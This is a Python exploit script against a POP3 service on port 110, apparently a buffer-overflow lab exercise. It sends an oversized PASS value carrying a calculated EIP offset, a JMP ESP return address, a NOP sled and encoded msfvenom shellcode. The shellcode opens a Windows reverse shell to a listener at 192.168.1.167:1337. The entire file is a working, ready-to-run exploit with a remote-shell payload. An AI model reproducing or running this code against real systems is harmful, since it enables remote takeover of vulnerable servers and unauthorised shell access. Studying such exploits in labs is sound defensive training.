#!/usr/bin/python3

import socket
from time import sleep

# Consts
IP = '192.168.56.102'
PORT = 110
MAX_BUFFER_SIZE = 2750
EIP_OFFSET = 2606

# NOP
NOP_SLED = b'\x90' * 16

# nasm JMP ESP -> FFE4 -> Memory address: 5F4A358F
JUMP_ESP = b'\x8f\x35\x4a\x5f'

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.167 LPORT=1337 -f python -b '\x00\x0a\x0d' -e x86/shikata_ga_nai
PAYLOAD =  b""
PAYLOAD += b"\xdb\xc2\xbd\x83\x8f\x9d\x30\xd9\x74\x24\xf4\x5b\x31"
PAYLOAD += b"\xc9\xb1\x52\x31\x6b\x17\x83\xeb\xfc\x03\xe8\x9c\x7f"
PAYLOAD += b"\xc5\x12\x4a\xfd\x26\xea\x8b\x62\xae\x0f\xba\xa2\xd4"
PAYLOAD += b"\x44\xed\x12\x9e\x08\x02\xd8\xf2\xb8\x91\xac\xda\xcf"
PAYLOAD += b"\x12\x1a\x3d\xfe\xa3\x37\x7d\x61\x20\x4a\x52\x41\x19"
PAYLOAD += b"\x85\xa7\x80\x5e\xf8\x4a\xd0\x37\x76\xf8\xc4\x3c\xc2"
PAYLOAD += b"\xc1\x6f\x0e\xc2\x41\x8c\xc7\xe5\x60\x03\x53\xbc\xa2"
PAYLOAD += b"\xa2\xb0\xb4\xea\xbc\xd5\xf1\xa5\x37\x2d\x8d\x37\x91"
PAYLOAD += b"\x7f\x6e\x9b\xdc\x4f\x9d\xe5\x19\x77\x7e\x90\x53\x8b"
PAYLOAD += b"\x03\xa3\xa0\xf1\xdf\x26\x32\x51\xab\x91\x9e\x63\x78"
PAYLOAD += b"\x47\x55\x6f\x35\x03\x31\x6c\xc8\xc0\x4a\x88\x41\xe7"
PAYLOAD += b"\x9c\x18\x11\xcc\x38\x40\xc1\x6d\x19\x2c\xa4\x92\x79"
PAYLOAD += b"\x8f\x19\x37\xf2\x22\x4d\x4a\x59\x2b\xa2\x67\x61\xab"
PAYLOAD += b"\xac\xf0\x12\x99\x73\xab\xbc\x91\xfc\x75\x3b\xd5\xd6"
PAYLOAD += b"\xc2\xd3\x28\xd9\x32\xfa\xee\x8d\x62\x94\xc7\xad\xe8"
PAYLOAD += b"\x64\xe7\x7b\xbe\x34\x47\xd4\x7f\xe4\x27\x84\x17\xee"
PAYLOAD += b"\xa7\xfb\x08\x11\x62\x94\xa3\xe8\xe5\x5b\x9b\xf3\x52"
PAYLOAD += b"\x33\xde\xf3\x99\xfd\x57\x15\xcb\xed\x31\x8e\x64\x97"
PAYLOAD += b"\x1b\x44\x14\x58\xb6\x21\x16\xd2\x35\xd6\xd9\x13\x33"
PAYLOAD += b"\xc4\x8e\xd3\x0e\xb6\x19\xeb\xa4\xde\xc6\x7e\x23\x1e"
PAYLOAD += b"\x80\x62\xfc\x49\xc5\x55\xf5\x1f\xfb\xcc\xaf\x3d\x06"
PAYLOAD += b"\x88\x88\x85\xdd\x69\x16\x04\x93\xd6\x3c\x16\x6d\xd6"
PAYLOAD += b"\x78\x42\x21\x81\xd6\x3c\x87\x7b\x99\x96\x51\xd7\x73"
PAYLOAD += b"\x7e\x27\x1b\x44\xf8\x28\x76\x32\xe4\x99\x2f\x03\x1b"
PAYLOAD += b"\x15\xb8\x83\x64\x4b\x58\x6b\xbf\xcf\x68\x26\x9d\x66"
PAYLOAD += b"\xe1\xef\x74\x3b\x6c\x10\xa3\x78\x89\x93\x41\x01\x6e"
PAYLOAD += b"\x8b\x20\x04\x2a\x0b\xd9\x74\x23\xfe\xdd\x2b\x44\x2b"

# POC - send 4 bytes to the EIP
overflow = (EIP_OFFSET * b'\x90') + JUMP_ESP + NOP_SLED + PAYLOAD

try:
  # Connect
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((IP, PORT))

  # Send Username
  welcome = s.recv(1024)
  username = b'USER Aviv' + b'\r\n'
  s.send(username)

  # Send Password
  greet_user = s.recv(1024)
  password = b'PASS ' + overflow + b'\r\n'

  print('- Attempting a buffer-overflow attack..')
  s.send(password)

  print('- Done, check the listening terminal.')

except Exception as e:
  print(e)
  exit()